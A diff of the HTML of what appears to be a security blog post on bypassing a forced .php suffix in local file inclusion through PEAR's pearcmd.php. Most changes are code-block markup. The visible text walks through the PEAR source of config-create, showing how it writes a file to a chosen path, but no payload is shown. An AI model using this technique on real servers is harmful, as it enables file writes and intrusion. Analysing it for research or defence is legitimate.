+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Then a factory is created and assigned to <code>$cmd</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Hovering <code>$cmd</code> shows the required parameters for the <code>config-create</code> command.</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" title="Required parameters for the `config-create` command" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" data-sub-html="<h2>doc</h2><p>Required parameters for the `config-create` command</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png' alt="doc" height="424" width="861"></a><figcaption class="image-caption">Required parameters for the `config-create` command</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" title="Required parameters for the `config-create` command" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" data-sub-html="<h2>doc</h2><p>Required parameters for the `config-create` command</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png' alt="doc" height="424" width="861"></a><figcaption class="image-caption">Required parameters for the `config-create` command</figcaption>
   </figure></p>
 <p>Notably, the execution function for <code>config-create</code> is <code>doConfigCreate</code>:</p>
-<div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">/usr/local/lib/php/PEAR/Command.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -765,11 +765,11 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="nv">$command</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>The function requires exactly 2 parameters: <code>root path</code> and <code>filename</code>. If not, it errors.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -781,11 +781,11 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;config-create: must have 2 parameters, root path and &#39;</span> <span class="o">.</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;filename to save as&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>If the first character of the root path is not <code>/</code>, the function checks whether the <code>windows</code> option is set.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -817,15 +817,15 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl"><span class="nv">$windows</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$windows</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><ul>
 <li>If not Windows → error because the path must start with <code>/</code>.</li>
 <li>If Windows → verify <code>C:</code> style path and convert <code>/</code> to <code>\</code> if needed.</li>
 </ul>
 <p>Then it attempts to create and validate the output config file:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -835,15 +835,15 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!@</span><span class="nx">touch</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Could not create &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><ul>
 <li>If the file doesn&rsquo;t exist, it attempts <code>touch()</code> to create it. If that fails → error.</li>
 <li>Uses <code>realpath</code> to obtain the absolute path.</li>
 </ul>
 <p>Create a config object and normalize <code>$root</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -855,11 +855,11 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Set directory values:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -869,11 +869,11 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;php_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\php</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/php&#34;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;data_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\data</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/data&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="o">...</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Finally write the configuration file, display it, and report success:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="hl"><span class="lnt">1
 </span></span><span class="lnt">2
 </span><span class="lnt">3
@@ -883,11 +883,11 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line hl"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$command</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="nv">$command</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>writeConfigFile()</code> is the function responsible for writing the config file.</p>
-<div class="highlight" title="/usr/local/lib/php/PEAR/Command/Config.php"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true" title="/usr/local/lib/php/PEAR/Command/Config.php"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">/usr/local/lib/php/PEAR/Command/Config.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -975,26 +975,26 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;PEAR_Config::writeConfigFile: fwrite failed (</span><span class="si">$php_errormsg</span><span class="s2">)&#34;</span><span class="p">);</span>
 </span></span><span class="line hl"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>This function is the one that writes the config file by <code>serialize($data)</code> to convert the configuration into a storable string.</p>
 <p>Back in <code>pearcmd.php</code>, the params are prepared and assigned to <code>$params</code>.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" title="Value of $params in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" data-sub-html="<h2>params</h2><p>Value of $params in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png' alt="params" height="244" width="1634"></a><figcaption class="image-caption">Value of $params in the debugger</figcaption>
+</div><p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" title="Value of $params in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" data-sub-html="<h2>params</h2><p>Value of $params in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png' alt="params" height="244" width="1634"></a><figcaption class="image-caption">Value of $params in the debugger</figcaption>
   </figure></p>
 <p>Finally, <code>$cmd</code> is executed via <code>$cmd-&gt;run()</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span></span></span></code></pre></td></tr></table>
